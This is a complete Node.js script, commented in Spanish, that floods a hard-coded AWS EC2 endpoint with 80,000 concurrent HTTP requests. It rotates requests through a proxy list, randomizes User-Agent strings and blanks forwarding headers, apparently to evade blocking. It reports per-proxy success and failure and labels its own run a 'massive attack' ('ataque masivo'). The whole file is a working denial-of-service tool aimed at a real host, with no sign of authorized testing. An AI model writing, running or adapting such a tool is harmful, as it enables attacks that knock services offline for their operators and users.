import agents from "./config/agents.js";
import proxies from "./config/proxies.js";
import PQueue from "p-queue";
import chalk from "chalk";
import { HttpsProxyAgent } from "https-proxy-agent";
import axios from "axios";
// Lista mejorada de proxies (agregué más y eliminé algunos que no funcionan)

const endpoint =
  "http://ec2-15-228-158-129.sa-east-1.compute.amazonaws.com/gonzo";
const totalRequests = 80000;
const timeoutMs = 60000;
const concurrency = 100000;

// Estadísticas mejoradas
const stats = {
  success: 0,
  failed: 0,
  timeouts: 0,
  errors: 0,
  startedAt: Date.now(),
  proxyUsage: new Map(), // Para rastrear proxies exitosos
  lastProxyIndex: 0,
  proxyFailures: new Map(), // 👈 Nuevo mapa para fallos
  updateCount: 0, // 👈 Contador de actualizaciones
};

// Cola para control de concurrencia
const queue = new PQueue({
  concurrency,
  timeout: timeoutMs * 1.5, // Tiempo de espera para la cola
  throwOnTimeout: false,
});

// Función para obtener un proxy aleatorio
function getRandomProxy() {
  return `http://${proxies[Math.floor(Math.random() * proxies.length)]}`
}

// Función para mostrar estadísticas en tiempo real
function showStats() {
  stats.updateCount++; // 👈 Incrementar contador

  const elapsed = Math.floor((Date.now() - stats.startedAt) / 1000);
  const totalRequestsMade = stats.success + stats.failed;
  const rate = elapsed > 0 ? Math.floor(totalRequestsMade / elapsed) : 0;
  const successRate =
    totalRequestsMade > 0
      ? ((stats.success / totalRequestsMade) * 100).toFixed(1)
      : "0.0";
  console.clear();
  console.log(chalk.bold("🔥 Ataque en Progreso 🔥"));
  console.log(chalk.green(`✅ Éxitos: ${stats.success}`));
  console.log(chalk.red(`❌ Fallos: ${stats.failed}`));
  console.log(chalk.yellow(`⏱ Timeouts: ${stats.timeouts}`));
  console.log(chalk.blue(`⚠️ Errores: ${stats.errors}`));
  console.log(chalk.cyan(`📈 Tasa de éxito: ${successRate}%`));
  console.log(chalk.magenta(`🚀 Velocidad: ${rate} req/seg`));
  console.log(chalk.white(`⏳ Tiempo: ${elapsed} segundos`));
  console.log(
    chalk.gray(
      `🌐 Proxies activos: ${proxies.length} | Proxies efectivos: ${stats.proxyUsage.size}`
    )
  );
  if (stats.updateCount % 10 === 0) {
    // Proxies exitosos
    const topSuccess = [...stats.proxyUsage.entries()]
      .sort((a, b) => b[1] - a[1])
      .slice(0, 3);

    // Proxies fallidos
    const topFailures = [...stats.proxyFailures.entries()]
      .sort((a, b) => b[1] - a[1])
      .slice(0, 3);

    console.log(chalk.bold("\n🌟 TOP 3 Proxies Exitosos:"));
    topSuccess.forEach(([proxy, count], i) =>
      console.log(chalk.cyan(` ${i + 1}. ${proxy} → ${count} éxitos`))
    );

    console.log(chalk.bold("\n💥 TOP 3 Proxies Fallidos:"));
    topFailures.forEach(([proxy, count], i) =>
      console.log(chalk.red(` ${i + 1}. ${proxy} → ${count} fallos`))
    );
  }
  console.log(chalk.gray("Presiona Ctrl+C para detener..."));
}

// Función mejorada para realizar solicitudes
async function testWithProxy(attempt, signal) {
  const proxy = getRandomProxy();

  try {
    const agent = new HttpsProxyAgent(proxy);
    agent.options.rejectUnauthorized = false;

    const response = await axios.get(endpoint, {
      httpAgent: agent,
      httpsAgent: agent,
      signal,
      timeout: timeoutMs,
      headers: {
        "X-Forwarded-For": "",
        Forwarded: "",
        Via: "",
        "User-Agent": agents[Math.floor(Math.random() * agents.length)],
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "no-cache",
        Pragma: "no-cache",
      },
      signal,
    });

    stats.success++;
    stats.proxyUsage.set(proxy, (stats.proxyUsage.get(proxy) || 0) + 1);

    if (attempt % 100 === 0) {
      console.log(
        chalk.green(
          `[${attempt}] Éxito via ${proxy} - Status: ${response.status}`
        )
      );
    }
    return true;
  } catch (err) {
    if (err.name === "CanceledError") return; // No contar como error
if (err.name === "TimeoutError") {
      stats.failed++;
      stats.timeouts++;
      stats.proxyFailures.set(proxy, (stats.proxyFailures.get(proxy) || 0) + 1);
      if (attempt % 50 === 0) {
        console.log(chalk.yellow(`[${attempt}] Timeout (p-queue) via ${proxy}`));
      }
      return false;
    }
    stats.failed++;
    stats.proxyFailures.set(proxy, (stats.proxyFailures.get(proxy) || 0) + 1); // 👈 Registrar fallo

    if (err.code === "ECONNABORTED") {
      stats.timeouts++;
      if (attempt % 50 === 0) {
        console.log(chalk.yellow(`[${attempt}] Timeout via ${proxy}`));
      }
    } else {
      stats.errors++;
      if (attempt % 50 === 0) {
        console.log(
          chalk.red(`[${attempt}] Error via ${proxy} - ${err.message}`)
        );
      }
    }
    return false;
  }
}

async function main() {
  console.log(chalk.bold(`🚀 Iniciando ataque masivo a ${endpoint}`));
  console.log(chalk.cyan(`📊 Total de solicitudes: ${totalRequests}`));
  console.log(chalk.cyan(`⚡ Solicitudes concurrentes: ${concurrency}`));
  console.log(chalk.cyan(`⏱ Timeout por solicitud: ${timeoutMs}ms`));
  console.log(chalk.cyan(`🔁 Proxies disponibles: ${proxies.length}`));
  console.log(chalk.cyan(`🔄 User-Agents: ${agents.length} diferentes`));
  console.log(chalk.gray("Preparando ataque...\n"));

  // Iniciar actualización de estadísticas
  const statsInterval = setInterval(showStats, 1000);

  const controller = new AbortController(); // 👈 Controlador de cancelación
  try {
    let completed = 0;

    for (let i = 0; i < totalRequests; i++) {
      queue
        .add(() => testWithProxy(i + 1, controller.signal)) // 👈 Pasar signal
        .finally(() => {
          if (++completed >= totalRequests) clearInterval(statsInterval);
        });
    }

    await queue.onIdle();
  } catch (error) {
    controller.abort(); // 👈 Cancelar solicitudes pendientes

    console.error(chalk.red(`Error principal: ${error.message}`));
  } finally {
    clearInterval(statsInterval);
    showStats();
    console.log(chalk.bold("\n🏁 Ataque completado"));

    // Mostrar resumen final
    const elapsed = Math.floor((Date.now() - stats.startedAt) / 1000);
    const successRate = ((stats.success / totalRequests) * 100).toFixed(1);

    console.log(chalk.bold("\n📊 RESUMEN FINAL"));
    console.log(chalk.cyan(`⌛ Duración total: ${elapsed} segundos`));
    console.log(
      chalk.green(`✅ Solicitudes exitosas: ${stats.success} (${successRate}%)`)
    );
    console.log(chalk.red(`❌ Solicitudes fallidas: ${stats.failed}`));
    console.log(chalk.yellow(`⏱ Timeouts: ${stats.timeouts}`));
    console.log(chalk.blue(`⚠️ Otros errores: ${stats.errors}`));

    // Mostrar top 5 proxies más efectivos
    if (stats.proxyUsage.size > 0) {
      console.log(chalk.bold("\n🏆 Proxies más efectivos:"));
      const sortedProxies = [...stats.proxyUsage.entries()]
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);

      sortedProxies.forEach(([proxy, count], index) => {
        console.log(chalk.cyan(`${index + 1}. ${proxy} - ${count} éxitos`));
      });
    }
    if (stats.proxyFailures.size > 0) {
      console.log(chalk.bold("\n💥 TOP 5 Proxies Fallidos:"));
      const sortedFailures = [...stats.proxyFailures.entries()]
        .sort((a, b) => b[1] - a[1])
        .slice(0, 5);

      sortedFailures.forEach(([proxy, count], i) => {
        console.log(chalk.red(` ${i + 1}. ${proxy} → ${count} fallos`));
      });
    }
  }
}

main();
